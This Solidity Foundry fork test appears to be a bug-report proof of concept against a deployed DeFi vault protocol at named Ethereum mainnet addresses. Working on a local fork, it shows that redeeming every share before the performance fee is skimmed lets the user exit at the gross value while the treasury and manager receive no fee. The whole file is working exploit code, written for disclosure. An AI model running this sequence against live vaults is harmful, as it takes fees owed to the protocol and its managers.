// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import { Test } from "forge-std/Test.sol";

import { SuperGovernor } from "../../src/SuperGovernor.sol";
import { SuperVaultAggregator } from "../../src/SuperVault/SuperVaultAggregator.sol";
import { SuperVault } from "../../src/SuperVault/SuperVault.sol";
import { SuperVaultStrategy } from "../../src/SuperVault/SuperVaultStrategy.sol";
import { ISuperVaultAggregator } from "../../src/interfaces/SuperVault/ISuperVaultAggregator.sol";
import { ISuperVaultStrategy } from "../../src/interfaces/SuperVault/ISuperVaultStrategy.sol";
import { MockERC20 } from "../mocks/MockERC20.sol";

/// @notice Local-fork reproduction using the deployed Ethereum SuperGovernor and
/// SuperVaultAggregator. The test creates a fresh vault through the production
/// aggregator, so its vault/strategy/escrow clones execute the production
/// implementation bytecode while all state changes remain local to the fork.
contract PreSkimRedeemFeeEscapeProductionForkPoC is Test {
    address internal constant PRODUCTION_GOVERNOR = 0xB5396ef2bF8CA360cEB4166b77AFb2bed20e74d4;
    address internal constant PRODUCTION_AGGREGATOR = 0x10AC0b33e1C4501CF3ec1cB1AE51ebfdbd2d4698;
    address internal constant PRODUCTION_PPS_ORACLE = 0x366d88F03B8EF34eb49F32a927ff6e1609F694F2;

    address internal constant PRODUCTION_VAULT_IMPLEMENTATION = 0x303834cd8681BD6Bd31ce7508822b12E2f38D9f2;
    address internal constant PRODUCTION_STRATEGY_IMPLEMENTATION = 0x770abd170404B8ed8182c04f380E567e647b457D;
    address internal constant PRODUCTION_ESCROW_IMPLEMENTATION = 0x8982cf48eaB6616f2892888410afad9b0CD2BC9B;

    address internal constant SUPER_USDC_VAULT = 0xf6EbeA08a0Dfd44825f67Fa9963911c81BE2a947;
    address internal constant SUPER_USDC_STRATEGY = 0x41A9Eb398518D2487301c61D2b33E4e966A9F1DD;
    address internal constant SUPER_USDC_ESCROW = 0x11c016dFb1745A81587e5e3Fa8fc75f5693F427b;

    SuperGovernor internal governor;
    SuperVaultAggregator internal aggregator;
    MockERC20 internal asset;
    SuperVault internal vault;
    SuperVaultStrategy internal strategy;

    address internal manager;
    address internal user;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETHEREUM_RPC_URL"));

        governor = SuperGovernor(PRODUCTION_GOVERNOR);
        aggregator = SuperVaultAggregator(PRODUCTION_AGGREGATOR);
        manager = makeAddr("forkManager");
        user = makeAddr("forkUser");
    }

    function testFork_ProductionAddressesAndFlagshipCloneAreAffected() public view {
        assertEq(address(aggregator.SUPER_GOVERNOR()), PRODUCTION_GOVERNOR);
        assertEq(aggregator.VAULT_IMPLEMENTATION(), PRODUCTION_VAULT_IMPLEMENTATION);
        assertEq(aggregator.STRATEGY_IMPLEMENTATION(), PRODUCTION_STRATEGY_IMPLEMENTATION);
        assertEq(aggregator.ESCROW_IMPLEMENTATION(), PRODUCTION_ESCROW_IMPLEMENTATION);

        SuperVault productionVault = SuperVault(SUPER_USDC_VAULT);
        SuperVaultStrategy productionStrategy = SuperVaultStrategy(payable(SUPER_USDC_STRATEGY));

        assertEq(address(productionVault.strategy()), SUPER_USDC_STRATEGY);
        assertEq(productionVault.escrow(), SUPER_USDC_ESCROW);
        (address strategyVault,,) = productionStrategy.getVaultInfo();
        assertEq(strategyVault, SUPER_USDC_VAULT);

        bytes memory expectedStrategyCloneRuntime = abi.encodePacked(
            hex"363d3d373d3d3d363d73",
            PRODUCTION_STRATEGY_IMPLEMENTATION,
            hex"5af43d82803e903d91602b57fd5bf3"
        );
        assertEq(
            keccak256(SUPER_USDC_STRATEGY.code),
            keccak256(expectedStrategyCloneRuntime),
            "flagship strategy is not a clone of the affected implementation"
        );
    }

    function testFork_UserRedemptionThroughProductionImplementationsErasesAllAccruedFee() public {
        asset = new MockERC20("Fork Asset", "FORK", 18);

        uint256 minimumStaleness = governor.getMinStaleness();
        (address vaultAddress, address strategyAddress,) = aggregator.createVault(
            ISuperVaultAggregator.VaultCreationParams({
                asset: address(asset),
                name: "Production Fork Fee Escape Vault",
                symbol: "PFFEV",
                mainManager: manager,
                secondaryManagers: new address[](0),
                minUpdateInterval: 1,
                maxStaleness: minimumStaleness,
                feeConfig: ISuperVaultStrategy.FeeConfig({
                    performanceFeeBps: 1_000,
                    managementFeeBps: 0,
                    recipient: manager
                })
            })
        );

        vault = SuperVault(vaultAddress);
        strategy = SuperVaultStrategy(payable(strategyAddress));

        // The production aggregator created EIP-1167 clones of its deployed
        // implementation contracts; no locally deployed vault logic is used.
        bytes memory expectedStrategyCloneRuntime = abi.encodePacked(
            hex"363d3d373d3d3d363d73",
            PRODUCTION_STRATEGY_IMPLEMENTATION,
            hex"5af43d82803e903d91602b57fd5bf3"
        );
        assertEq(keccak256(strategyAddress.code), keccak256(expectedStrategyCloneRuntime));

        vm.prank(manager);
        aggregator.updateDeviationThreshold(strategyAddress, 1e18);

        asset.mint(user, 100 ether);
        vm.startPrank(user);
        asset.approve(vaultAddress, type(uint256).max);
        vault.deposit(100 ether, user);
        vm.stopPrank();

        // Add 100 assets of real gain and submit a 2.0 PPS through the deployed
        // aggregator's production oracle-only entrypoint. Upkeep is mocked off
        // only to isolate this unrelated fee-accounting invariant.
        asset.mint(strategyAddress, 100 ether);
        vm.warp(block.timestamp + minimumStaleness / 2 + 2);
        vm.mockCall(
            PRODUCTION_GOVERNOR,
            abi.encodeWithSelector(SuperGovernor.isUpkeepPaymentsEnabled.selector),
            abi.encode(false)
        );

        address[] memory strategies = new address[](1);
        strategies[0] = strategyAddress;
        uint256[] memory ppss = new uint256[](1);
        ppss[0] = 2 ether;
        uint256[] memory timestamps = new uint256[](1);
        timestamps[0] = block.timestamp;

        vm.prank(PRODUCTION_PPS_ORACLE);
        aggregator.forwardPPS(
            ISuperVaultAggregator.ForwardPPSArgs({
                strategies: strategies,
                ppss: ppss,
                timestamps: timestamps,
                updateAuthority: PRODUCTION_PPS_ORACLE
            })
        );
        vm.clearMockedCalls();

        assertEq(aggregator.getPPS(strategyAddress), 2 ether);
        assertEq(strategy.vaultHwmPps(), 1 ether);
        assertEq(vault.totalSupply(), 100 ether);

        // Control: before redemption the production implementation calculates a
        // 10-asset total fee on the 100-asset gain. Production currently splits
        // that fee 50/50 between Superform treasury and the strategy recipient.
        uint256 snapshot = vm.snapshotState();
        address treasury = governor.getAddress(governor.TREASURY());
        uint256 strategyBeforeControl = asset.balanceOf(strategyAddress);
        uint256 managerBeforeControl = asset.balanceOf(manager);
        uint256 treasuryBeforeControl = asset.balanceOf(treasury);

        vm.prank(manager);
        strategy.skimPerformanceFee();

        uint256 totalFeeCollected = strategyBeforeControl - asset.balanceOf(strategyAddress);
        assertEq(totalFeeCollected, 10 ether, "production implementation should collect a 10-asset total fee");
        assertEq(asset.balanceOf(manager) - managerBeforeControl, 5 ether, "recipient receives its production share");
        assertEq(asset.balanceOf(treasury) - treasuryBeforeControl, 5 ether, "treasury receives its production share");
        vm.revertToState(snapshot);

        // Unprivileged user chooses to redeem all fee-bearing shares.
        vm.prank(user);
        vault.requestRedeem(100 ether, user, user);

        address[] memory controllers = new address[](1);
        controllers[0] = user;
        uint256[] memory outputs = new uint256[](1);
        outputs[0] = 200 ether;

        // Honest manager performs the intended fulfillment operation.
        vm.prank(manager);
        strategy.fulfillRedeemRequests(controllers, outputs);

        assertEq(vault.totalSupply(), 0);
        assertEq(vault.maxWithdraw(user), 200 ether);

        // The same deployed skim implementation now returns early because the
        // user-controlled redemption burn reduced current supply to zero.
        uint256 strategyBeforeAttack = asset.balanceOf(strategyAddress);
        uint256 managerBeforeAttack = asset.balanceOf(manager);
        uint256 treasuryBeforeAttack = asset.balanceOf(treasury);

        vm.prank(manager);
        strategy.skimPerformanceFee();

        assertEq(asset.balanceOf(strategyAddress), strategyBeforeAttack, "no total fee leaves the strategy");
        assertEq(asset.balanceOf(manager), managerBeforeAttack, "recipient receives no fee");
        assertEq(asset.balanceOf(treasury), treasuryBeforeAttack, "treasury receives no fee");

        vm.prank(user);
        vault.withdraw(200 ether, user, user);
        assertEq(asset.balanceOf(user), 200 ether, "user exits at gross pre-fee value");
    }
}
